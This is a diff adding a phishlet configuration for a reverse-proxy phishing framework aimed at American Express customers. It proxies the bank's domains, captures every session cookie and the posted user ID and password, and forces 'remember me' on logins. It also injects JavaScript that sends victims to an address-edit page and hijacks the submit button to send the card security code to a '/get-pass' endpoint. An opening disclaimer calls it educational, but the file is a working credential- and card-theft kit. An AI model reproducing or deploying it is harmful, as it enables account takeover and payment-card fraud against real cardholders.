@@ -1,0 +1,140 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+
+author: '@test'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'americanexpress.com', session: true, is_landing: false}
+  - {phish_sub: 'one', orig_sub: 'one', domain: 'americanexpress.com', session: true, is_landing: false}
+  - {phish_sub: 'global', orig_sub: 'global', domain: 'americanexpress.com', session: true, is_landing: true}
+  - {phish_sub: 'omns', orig_sub: 'omns', domain: 'americanexpress.com', session: true, is_landing: false}
+  - {phish_sub: 'aug', orig_sub: 'aug', domain: 'americanexpress.com', session: true, is_landing: false}
+  - {phish_sub: 'assets', orig_sub: 'assets', domain: 'adobedtm.com', session: true, is_landing: false}
+  - {phish_sub: 'static', orig_sub: 'www', domain: 'aexp-static.com', session: true, is_landing: false}  
+  - {phish_sub: 'iwmap', orig_sub: 'iwmap', domain: 'americanexpress.com', session: true, is_landing: false}
+  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'americanexpress.com', session: true, is_landing: false}
+  - {phish_sub: 'm', orig_sub: 'one-xp', domain: 'americanexpress.com', session: true, is_landing: false}
+
+sub_filters:
+ 
+  - {triggers_on: 'www.americanexpress.com', orig_sub: 'www', domain: 'americanexpress.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.americanexpress.com', orig_sub: 'www', domain: 'americanexpress.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.americanexpress.com', orig_sub: 'www', domain: 'americanexpress.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.americanexpress.com', orig_sub: 'sso', domain: 'americanexpress.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.americanexpress.com', orig_sub: 'sso', domain: 'americanexpress.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.americanexpress.com', orig_sub: 'sso', domain: 'americanexpress.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.americanexpress.com', orig_sub: 'one', domain: 'americanexpress.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.americanexpress.com', orig_sub: 'one', domain: 'americanexpress.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.americanexpress.com', orig_sub: 'one', domain: 'americanexpress.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.americanexpress.com', orig_sub: 'static', domain: 'americanexpress.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.americanexpress.com', orig_sub: 'static', domain: 'americanexpress.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.americanexpress.com', orig_sub: 'static', domain: 'americanexpress.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.americanexpress.com', orig_sub: 'one-xp', domain: 'americanexpress.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.americanexpress.com', orig_sub: 'one-xp', domain: 'americanexpress.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.americanexpress.com', orig_sub: 'one-xp', domain: 'americanexpress.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.americanexpress.com', orig_sub: 'assets', domain: 'adobedtm.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.americanexpress.com', orig_sub: 'assets', domain: 'adobedtm.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.americanexpress.com', orig_sub: 'assets', domain: 'adobedtm.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.americanexpress.com', orig_sub: 'global', domain: 'aexp-static.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.americanexpress.com', orig_sub: 'global', domain: 'aexp-static.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.americanexpress.com', orig_sub: 'global', domain: 'aexp-static.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+  - {triggers_on: 'global.americanexpress.com', orig_sub: 'www', domain: 'americanexpress.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'global.americanexpress.com', orig_sub: 'www', domain: 'americanexpress.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'global.americanexpress.com', orig_sub: 'www', domain: 'americanexpress.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'global.americanexpress.com', orig_sub: 'sso', domain: 'americanexpress.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'global.americanexpress.com', orig_sub: 'sso', domain: 'americanexpress.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'global.americanexpress.com', orig_sub: 'sso', domain: 'americanexpress.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'global.americanexpress.com', orig_sub: 'assets', domain: 'adobedtm.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'global.americanexpress.com', orig_sub: 'assets', domain: 'adobedtm.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'global.americanexpress.com', orig_sub: 'assets', domain: 'adobedtm.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'global.americanexpress.com', orig_sub: 'global', domain: 'aexp-static.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'global.americanexpress.com', orig_sub: 'global', domain: 'aexp-static.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'global.americanexpress.com', orig_sub: 'global', domain: 'aexp-static.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+#https://global.americanexpress.com/address/edit?linknav=US-Ser-AccountService-ShortcutsLT-EditAddress
+#/dashboard
+
+auth_tokens:
+  - domain: '.americanexpress.com'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/dashboard'
+  - '/dashboard.*'    
+credentials:
+  username:
+    key: 'UserID'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'Password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'USERID'
+      search: '(.*)'
+      type: 'post'
+    - key: 'fieldName' #this is CSC no.
+      search: '(.*)'
+      type: 'post'
+    - key: 'fieldValue' #this is CSC no.
+      search: '(.*)'
+      type: 'post'
+    - key: 'CSC' #this is CSC no. which is leaked by javascript.
+      search: '(.*)'
+      type: 'post'
+
+force_post:
+  - path: '/myca/logon/us/action/login'
+    search:
+      - {key: 'UserID', search: '.*'}
+      - {key: 'Password', search: '.*'}
+    force:
+      - {key: 'REMEMBERME', value: 'on'}
+    type: 'post'
+  - path: '/SPS/logon'
+    search:
+      - {key: 'USERID', search: '.*'}
+      - {key: 'PWD', search: '.*'}
+    force:
+      - {key: 'REMEMBERME', value: 'on'}
+    type: 'post'
+        
+login:
+  domain: 'www.americanexpress.com'
+  path: 'en-us/account/login'
+
+js_inject:
+  - trigger_domains: ["global.americanexpress.com"]
+    trigger_paths: ["/dashboard","/dashboard.*"]
+    trigger_params: [domain]
+    script: |
+      function lp3(){
+        window.location.href = "/address/edit";
+        return;
+        }
+        setTimeout(function(){ lp3(); }, 2000);
+        
+  - trigger_domains: ["global.americanexpress.com"]
+    trigger_paths: ["/address/edit","/address/edit.*"]
+    trigger_params: []
+    script: |
+      function lp(){
+        var submit = document.getElementsByClassName("axp-authorize-action__CommonStyles__actionButton___3srKM axp-authorize-action__module__btnBlock___2zdf9 axp-authorize-action__module__btnPrimary___12_Y9 ")[0];
+        submit.setAttribute("onclick", "send_csc();");
+        var elem1 = document.getElementsByClassName("axp-authorize-action__Title__header___2Kc6R axp-authorize-action__module__flex___2K-F0 axp-authorize-action__module__flexAlignCenter___gRPvt dls-accent-white-01-bg border-b dls-accent-gray-06")[0];
+        elem1.parentNode.removeChild(elem1);
+        return;
+      }
+      function send_csc(){
+        var csc = document.getElementsByName("question-input")[0].value;
+        var email = document.getElementsByName("email")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/get-pass', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("CSC="+encodeURIComponent(csc));
+        return;
+      }
+      setTimeout(function(){ lp(); }, 2500);
